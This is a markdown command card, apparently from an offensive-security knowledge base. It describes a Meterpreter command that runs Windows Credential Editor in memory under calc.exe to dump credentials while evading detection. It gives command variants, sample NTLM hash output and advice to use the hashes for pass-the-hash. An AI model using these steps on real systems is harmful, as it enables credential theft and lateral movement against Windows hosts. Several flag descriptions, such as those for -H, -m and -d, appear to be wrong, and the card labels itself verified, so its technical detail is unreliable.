---
type: command
executor: meterpreter
data: execute -H -i -c -m -d calc.exe -f /root/wce.exe -a  -w
tags:
  - post-exploitation
  - credential-access
platforms:
  - Windows
verified: true
validated: true
---

# meterpreter-execute-wce-via-calculator

## Command

```meterpreter
execute -H -i -c -m -d calc.exe -f /root/wce.exe -a  -w
```

## Description

This Meterpreter command executes the Windows Credential Editor (WCE) tool in the context of calc.exe from memory, using high integrity and interactive mode to evade detection while dumping credentials. It is used in post-exploitation to perform credential access without writing files to disk.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -H | Run with high integrity level (SYSTEM/admin) | No |
| -i | Run interactively | No |
| -c | Allocate a new console window | No |
| -m | Migrate to a new process after execution | No |
| -d calc.exe | Specify the working directory (note: adjust to valid path like C:\Windows\System32 for accuracy) | No |
| -f /root/wce.exe | Path to the WCE executable (upload to target first; /root/ assumes staged location) | Yes |
| -a  | Arguments to pass to the executed file (empty here; add e.g., -w for wordlist) | No |
| -w | Wait for the program to finish before returning control | No |

## Examples

### Basic Usage

```meterpreter
execute -H -i -c -m -d C:\Windows\System32 -f wce.exe -a "-w" -w
```

### Advanced Usage

```meterpreter
execute -H -f wce.exe -a "-l" -w
```

This variation lists local credentials without console or migration.

## Expected Output

Successful execution shows WCE output in the Meterpreter session, such as:

```
WCE v1.3 (built Sep 18 2012 00:22:58)

[+] User : TESTUSER
[+] Domain: TESTDOMAIN
[+] NTLM : aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
[+] LSA Secrets Key: 01 23 45 67 89 ab cd ef 01 23 45 67 89 ab cd ef

Process terminated.
```

Credentials are dumped to stdout; use them for pass-the-hash attacks.

## Related

- [[Related Procedure: Memory Execution of Calculator and WCE with Meterpreter]]
- [[Related Command: meterpreter-execute-calculator]]
